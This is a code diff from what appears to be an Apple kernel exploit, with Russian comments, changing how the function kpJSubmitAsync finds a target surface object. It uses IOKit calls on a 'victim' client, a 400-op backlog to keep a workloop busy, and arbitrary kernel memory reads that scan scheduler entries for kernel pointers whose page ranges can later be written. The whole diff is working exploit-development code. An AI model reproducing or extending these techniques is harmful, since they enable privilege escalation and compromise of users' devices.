@@ -5798,28 +5798,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         free(ctl);
         return r;
     }
-    // 3. Trusted-path резолв через КЛИЕНТА (1.9.127): victim client → его
-    //    per-pipeline контекст ([client+0x030] — A6 показал: счётчики ops
-    //    растут на async) → diff до/после submit = указатель на op-entry →
-    //    surface ptr (верификация ranges-цепочкой). Никакого scheduler/мусора.
-    uint64_t victimVA = kpM2TClientVA(r, isTable, victim, @"victim");
-    uint64_t ctxVA = 0;
-    if (victimVA) {
-        kpRead(victimVA + 0x030, &ctxVA, 8, "ps ctx", r);
-        ctxVA = kp_untag_ptr(ctxVA);
-        if (!kpLooksLikeKernelPointer(ctxVA)) ctxVA = 0;
-    }
-    kpNote(r, [NSString stringWithFormat:@"  victimVA=%#llx ctxVA=%#llx", (unsigned long long)victimVA, (unsigned long long)ctxVA]);
-    if (!ctxVA) {
-        kpNote(r, @"  контекст не резолвнулся — SKIP");
-        IOObjectRelease(svc);
-        free(ctl);
-        return r;
-    }
-    // снапшот контекста ДО submit
-    uint8_t ctxPre[0x200];
-    memset(ctxPre, 0, sizeof(ctxPre));
-    kpRead(ctxVA, ctxPre, sizeof(ctxPre), "ps ctx pre", r);
+    // 3. Резолв через scheduler-массив (1.9.128): записи очереди несут dstS
+    //    (churn с теми же srcID/dstID); полный скан записи 0x21c0 — раунд 19:
+    //    surface ptr НЕ в заголовке, а в cfg/per-plane регионах 0x400+.
     // backlog: churn держит workloop занятым ≈15-25мс (400 × ~40мкс)
     uint8_t tsdZ[KP_M2_TSD_SIZE];
     memset(tsdZ, 0, sizeof(tsdZ));
@@ -5836,43 +5817,59 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=400): kr=0x%x", avkr]);
-    // diff контекста: новые kernel-ptr'ы = op-entry'и появившихся ops
-    uint8_t ctxPost[0x200];
-    memset(ctxPost, 0, sizeof(ctxPost));
-    kpRead(ctxVA, ctxPost, sizeof(ctxPost), "ps ctx post", r);
-    uint64_t surfVA = 0, rangesVA = 0;
-    int newPtrs = 0;
-    for (uint32_t oo = 0; oo + 8 <= 0x200 && !rangesVA; oo += 8) {
-        uint64_t qPost = 0, qPre = 0;
-        memcpy(&qPost, ctxPost + oo, 8);
-        memcpy(&qPre, ctxPre + oo, 8);
-        if (qPost == qPre) continue;
-        uint64_t cand = kp_untag_ptr(qPost);
-        if (!kpLooksLikeKernelPointer(cand)) continue;
-        newPtrs++;
-        // cand = op-entry?: в его полях ищем surface ptr по ranges-цепочке
-        for (uint32_t eo = 0; eo <= 0x80 && !rangesVA; eo += 8) {
-            uint64_t S = 0;
-            if (!kpRead(cand + eo, &S, 8, "ps S", r)) continue;
-            S = kp_untag_ptr(S);
-            if (!kpLooksLikeKernelPointer(S)) continue;
-            uint64_t ro = 0, rq = 0;
-            if (!kpRead(S + 0x178, &ro, 8, "ps ro", r)) continue;
-            ro = kp_untag_ptr(ro);
-            if (!kpLooksLikeKernelPointer(ro)) continue;
-            if (!kpRead(ro + 0x18, &rq, 8, "ps rq", r)) continue;
-            if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
-            surfVA = S;
-            rangesVA = ro + 0x18;
-            kpNote(r, [NSString stringWithFormat:@"  ★ ctx+%#x op+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                      oo, eo, (unsigned long long)surfVA, (unsigned long long)ro,
-                      (unsigned long long)rangesVA, (unsigned long long)rq]);
+    // записи очереди scheduler'а (churn-опы несут dstS) — полный скан записи
+    // 0x21c0 chain-верификацией (раунд 19: surface ptr НЕ в заголовке 0x00-0x80,
+    // а в cfg/per-plane регионах 0x400+; band-фильтр на указатели)
+    uint64_t driverVA = kpM2TClientVA(r, isTable, svc, @"driver");
+    uint64_t schedVA = 0;
+    if (driverVA) {
+        uint64_t cand[64];
+        uint32_t candN = kpM2OCollectPtrs(driverVA, 0x800, cand, 64, r);
+        for (uint32_t i = 0; i < candN && !schedVA; i++) {
+            uint64_t cnt = 0, arr = 0, arr2 = 0;
+            if (!kpRead(cand[i] + 0xb8, &cnt, 8, "ps sch+b8", r)) continue;
+            if (!kpRead(cand[i] + 0xc8, &arr, 8, "ps sch+c8", r)) continue;
+            if (!kpRead(cand[i] + 0x110, &arr2, 8, "ps sch+110", r)) continue;
+            arr = kp_untag_ptr(arr);
+            arr2 = kp_untag_ptr(arr2);
+            if (cnt > 0x2000) continue;
+            if (!kpLooksLikeKernelPointer(arr) || !kpLooksLikeKernelPointer(arr2)) continue;
+            schedVA = cand[i];
         }
     }
-    kpNote(r, [NSString stringWithFormat:@"  ctx-diff: новых ptr=%d, surfVA=%#llx rangesVA=%#llx",
-              newPtrs, (unsigned long long)surfVA, (unsigned long long)rangesVA]);
+    kpNote(r, [NSString stringWithFormat:@"  driverVA=%#llx schedVA=%#llx", (unsigned long long)driverVA, (unsigned long long)schedVA]);
+    uint64_t surfVA = 0, rangesVA = 0;
+    if (schedVA) {
+        uint64_t eptrs[128];
+        uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
+        kpNote(r, [NSString stringWithFormat:@"  entries=%u — полный скан записей (0x21c0)", eN]);
+        for (uint32_t i = 0; i < eN && i < 8 && !rangesVA; i++) {
+            uint8_t ebuf[0x2200];
+            memset(ebuf, 0, sizeof(ebuf));
+            if (!kpRead(eptrs[i], ebuf, sizeof(ebuf), "ps entry full", r)) continue;
+            for (uint32_t eo = 0; eo + 8 <= sizeof(ebuf) && !rangesVA; eo += 8) {
+                uint64_t S = 0;
+                memcpy(&S, ebuf + eo, 8);
+                S = kp_untag_ptr(S);
+                if (S < 0xffffffdc00000000ULL || S >= 0xffffffe400000000ULL) continue;
+                uint64_t ro = 0, rq = 0;
+                if (!kpRead(S + 0x178, &ro, 8, "ps ro", r)) continue;
+                ro = kp_untag_ptr(ro);
+                if (ro < 0xffffffdc00000000ULL || ro >= 0xffffffe400000000ULL) continue;
+                if (!kpRead(ro + 0x18, &rq, 8, "ps rq", r)) continue;
+                if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+                surfVA = S;
+                rangesVA = ro + 0x18;
+                kpNote(r, [NSString stringWithFormat:@"  ★ entry[%u]+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                          i, eo, (unsigned long long)surfVA, (unsigned long long)ro,
+                          (unsigned long long)rangesVA, (unsigned long long)rq]);
+            }
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
+              (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     if (!rangesVA) {
-        kpNote(r, @"  op-entry/surfVA через контекст не резолвнулись — записей не будет");
+        kpNote(r, @"  surface ptr в записях не найден — записей не будет");
         IOObjectRelease(svc);
         free(ctl);
         return r;
